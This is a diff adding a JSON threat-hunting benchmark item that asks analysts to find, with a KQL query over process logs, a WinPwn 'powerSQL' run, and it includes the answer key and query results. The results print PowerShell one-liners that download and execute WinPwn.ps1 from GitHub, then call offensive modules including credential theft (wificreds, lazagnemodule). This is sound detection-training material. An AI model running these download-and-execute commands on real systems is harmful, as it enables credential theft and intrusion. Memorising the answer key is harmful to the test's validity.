@@ -1,0 +1,92 @@
+{
+    "technique_id": "T1518",
+    "question_id": "0bb64470-582a-4155-bde2-d6003a95ed34",
+    "context": "A Windows host where an attacker leverages WinPwn to perform PowerUpSQL checks by downloading and executing a PowerShell script.",
+    "objective": "Detect when the powerSQL function is invoked after retrieving the WinPwn PowerShell script.",
+    "technical_details": {
+        "command_analysis": "Look for PowerShell command lines that first use DownloadString to fetch WinPwn.ps1 and then run 'powerSQL -noninteractive -consoleoutput'.",
+        "detection_approach": "Query DeviceProcessEvents, filtering on ProcessCommandLine or InitiatingProcessCommandLine for the downloadstring URL and the subsequent powerSQL invocation in a powershell.exe process."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Phrase the question to force the analyst to hunt process command lines and extract the exact tool name run after the script download.",
+    "prompt": "Suspicious PowerShell activity on a Windows machine shows an external script being fetched and executed, followed by a quiet SQL enumeration call. Using process event logs, identify the name of the tool executed immediately after the script retrieval.",
+    "answer": [
+        "powerSQL"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "let WinPwnDownload = DeviceProcessEvents\n| where FileName == \"powershell.exe\"\n| where ProcessCommandLine contains \"DownloadString\" and ProcessCommandLine contains \"WinPwn.ps1\"\n| project DeviceId, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountSid, DownloadTime=TimeGenerated, DownloadCommand=ProcessCommandLine;\nlet PowerSQLExec = DeviceProcessEvents\n| where FileName == \"powershell.exe\"\n| where ProcessCommandLine contains \"powerSQL -noninteractive -consoleoutput\"\n| project DeviceId, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountSid, ExecutionTime=TimeGenerated, ExecutedCommand=ProcessCommandLine;\nWinPwnDownload\n| join kind=inner PowerSQLExec on DeviceId, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountSid\n| where ExecutionTime between (DownloadTime .. DownloadTime + 1h)\n| project DeviceName, AccountName=InitiatingProcessAccountName, DownloadTime, ExecutionTime, DownloadCommand, ExecutedCommand",
+    "KQL_validation_message": "KQL query validation successful: Reviewing the 'DownloadCommand' and 'ExecutedCommand' columns in each result row, it is clear that the string 'powerSQL' appears as part of the command lines. This directly matches the expected answer 'powerSQL'. Therefore, the query results do provide the necessary evidence to identify the activities described in the expected answers.",
+    "KQL_query_results": [
+        [
+            "DeviceName",
+            "AccountName",
+            "DownloadTime",
+            "ExecutionTime",
+            "DownloadCommand",
+            "ExecutedCommand"
+        ],
+        [
+            "windows-vm",
+            "wipro",
+            "2025-05-07 17:06:40.943659+00:00",
+            "2025-05-07 17:06:40.943659+00:00",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput}",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput}"
+        ],
+        [
+            "windows-vm",
+            "wipro",
+            "2025-05-07 17:04:33.962811+00:00",
+            "2025-05-07 17:06:40.943659+00:00",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive}",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput}"
+        ],
+        [
+            "windows-vm",
+            "wipro",
+            "2025-05-07 17:04:08.356314+00:00",
+            "2025-05-07 17:06:40.943659+00:00",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive}",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput}"
+        ],
+        [
+            "windows-vm",
+            "wipro",
+            "2025-05-07 16:55:05.043527+00:00",
+            "2025-05-07 17:06:40.943659+00:00",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive}",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput}"
+        ],
+        [
+            "windows-vm",
+            "wipro",
+            "2025-05-07 16:53:40.942799+00:00",
+            "2025-05-07 17:06:40.943659+00:00",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput}",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput}"
+        ],
+        [
+            "windows-vm",
+            "wipro",
+            "2025-05-07 16:33:47.688849+00:00",
+            "2025-05-07 17:06:40.943659+00:00",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput}",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput}"
+        ],
+        [
+            "windows-vm",
+            "wipro",
+            "2025-05-07 16:33:47.688445+00:00",
+            "2025-05-07 17:06:40.943659+00:00",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput}",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput}"
+        ],
+        [
+            "windows-vm",
+            "wipro",
+            "2025-05-07 16:23:05.768042+00:00",
+            "2025-05-07 17:06:40.943659+00:00",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput}",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput}"
+        ]
+    ]
+}
